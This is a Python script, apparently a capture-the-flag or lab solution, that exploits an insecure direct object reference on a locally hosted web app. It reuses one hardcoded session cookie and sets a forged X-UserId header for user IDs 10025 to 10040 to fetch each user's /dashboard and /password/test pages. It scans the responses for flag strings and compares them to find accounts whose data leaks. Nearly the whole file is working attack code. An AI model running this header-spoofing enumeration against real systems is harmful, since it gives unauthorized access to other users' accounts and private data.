import requests
import re

base_url = "http://127.0.0.1:33200"
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfPOA.b4xDl8YHos70T-UyrMaks8tnRhU"

cookies = {"session": session_cookie}
test_user_ids = range(10025, 10041)

print("[*] Testing IDOR vulnerability via X-UserId header manipulation")
print(f"[*] Testing {len(test_user_ids)} user IDs: {list(test_user_ids)}")
print(f"[*] Using session cookie: {session_cookie[:30]}...")
print()

dashboard_responses = {}
password_responses = {}

for user_id in test_user_ids:
    headers = {"X-UserId": str(user_id)}
    
    print(f"\n[TEST] User ID: {user_id}")
    print("-" * 50)
    
    try:
        resp_dashboard = requests.get(
            f"{base_url}/dashboard",
            headers=headers,
            cookies=cookies,
            timeout=10
        )
        dashboard_responses[user_id] = resp_dashboard
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_dashboard.text)
        if flag_match:
            print(f"[!] FLAG FOUND in /dashboard response for user_id={user_id}")
            print(f"[!] Flag: {flag_match.group()}")
        
        print(f"[+] /dashboard - Status: {resp_dashboard.status_code} | Length: {len(resp_dashboard.content)}B")
        print(f"[+] /dashboard - Response:\n{resp_dashboard.text}")
        
    except Exception as e:
        print(f"[-] /dashboard - Error: {e}")
    
    try:
        resp_password = requests.get(
            f"{base_url}/password/test",
            headers=headers,
            cookies=cookies,
            timeout=10
        )
        password_responses[user_id] = resp_password
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_password.text)
        if flag_match:
            print(f"[!] FLAG FOUND in /password/test response for user_id={user_id}")
            print(f"[!] Flag: {flag_match.group()}")
        
        print(f"[+] /password/test - Status: {resp_password.status_code} | Length: {len(resp_password.content)}B")
        print(f"[+] /password/test - Response:\n{resp_password.text}")
        
    except Exception as e:
        print(f"[-] /password/test - Error: {e}")

print("\n" + "="*70)
print("[*] ANALYSIS: Comparing responses for differences")
print("="*70)

print("\n[+] Dashboard Response Analysis:")
dashboard_statuses = {}
for user_id, resp in dashboard_responses.items():
    status = resp.status_code
    if status not in dashboard_statuses:
        dashboard_statuses[status] = []
    dashboard_statuses[status].append(user_id)

for status, user_ids in dashboard_statuses.items():
    print(f"  Status {status}: {len(user_ids)} users - {user_ids}")

print("\n[+] Password/Test Response Analysis:")
password_statuses = {}
for user_id, resp in password_responses.items():
    status = resp.status_code
    if status not in password_statuses:
        password_statuses[status] = []
    password_statuses[status].append(user_id)

for status, user_ids in password_statuses.items():
    print(f"  Status {status}: {len(user_ids)} users - {user_ids}")

print("\n[+] Looking for unique response patterns:")

dashboard_contents = {}
for user_id, resp in dashboard_responses.items():
    content = resp.text
    if content not in dashboard_contents:
        dashboard_contents[content] = []
    dashboard_contents[content].append(user_id)

if len(dashboard_contents) > 1:
    print(f"[!!!] Found {len(dashboard_contents)} DIFFERENT dashboard responses!")
    pattern_count = 0
    for content, user_ids in dashboard_contents.items():
        pattern_count += 1
        if pattern_count <= 3:
            print(f"\n  Pattern {pattern_count} (Users: {user_ids}):")
            print(f"  Content preview: {content[:200]}...")
else:
    print("[-] All dashboard responses appear identical")

password_contents = {}
for user_id, resp in password_responses.items():
    content = resp.text
    if content not in password_contents:
        password_contents[content] = []
    password_contents[content].append(user_id)

if len(password_contents) > 1:
    print(f"[!!!] Found {len(password_contents)} DIFFERENT password/test responses!")
    pattern_count = 0
    for content, user_ids in password_contents.items():
        pattern_count += 1
        if pattern_count <= 3:
            print(f"\n  Pattern {pattern_count} (Users: {user_ids}):")
            print(f"  Content preview: {content[:200]}...")
else:
    print("[-] All password/test responses appear identical")

print("\n[*] IDOR test completed")
